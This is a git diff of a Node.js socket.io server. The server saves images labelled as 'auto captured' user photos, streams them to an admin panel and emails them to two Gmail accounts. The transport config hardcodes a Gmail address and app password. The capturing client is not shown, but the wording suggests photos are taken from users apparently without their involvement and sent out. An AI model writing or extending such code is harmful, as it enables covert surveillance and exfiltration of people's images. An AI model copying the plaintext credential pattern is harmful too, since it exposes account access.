@@ -14,13 +14,12 @@ if (!fs.existsSync(uploadDir)) {
     fs.mkdirSync(uploadDir);
 }
 
-// ⚠️ Gmail Transport Setup
-// APP PASSWORD NOTE: Aapko Google Account Settings -> Security -> App Passwords me jaakar 16-digit App Password generate karke yahan daalna hota hai.
+// 📧 Transporter Config with Provided App Password
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-        user: 'Md.danish7499@gmail.com',         // 👈 Sender Gmail ID
-        pass: 'qohs qivc jlvo iat'      // 👈 Gmail 16-digit App Password
+        user: 'md.danish7499@gmail.com',
+        pass: 'qohs qivc jlvo iat' // 👈 Aapka 16-digit App Password config
     }
 });
 
@@ -70,13 +69,13 @@ io.on('connection', (socket) => {
             if (!err) console.log(`✅ Photo Saved: uploads/${fileName}`);
         });
 
-        // Live stream to Admin panel
+        // Broadcast to Admin live panel
         io.emit('send-photo-to-admin', imageData);
 
-        // 📧 Both Email Recipients Added Here
+        // Send Email to Both Accounts
         const mailOptions = {
-            from: 'Md.danish7499@gmail.com',
-            to: 'Practice@gmail.com, Md.danish7499@gmail.com', // 👈 Dono Email IDs par ek sath jayega
+            from: 'md.danish7499@gmail.com',
+            to: 'prectice@gmail.com, md.danish7499@gmail.com',
             subject: '📸 Live Auto Captured Photo',
             text: 'User photo auto captured successfully.',
             attachments: [{ filename: fileName, content: base64Data, encoding: 'base64' }]
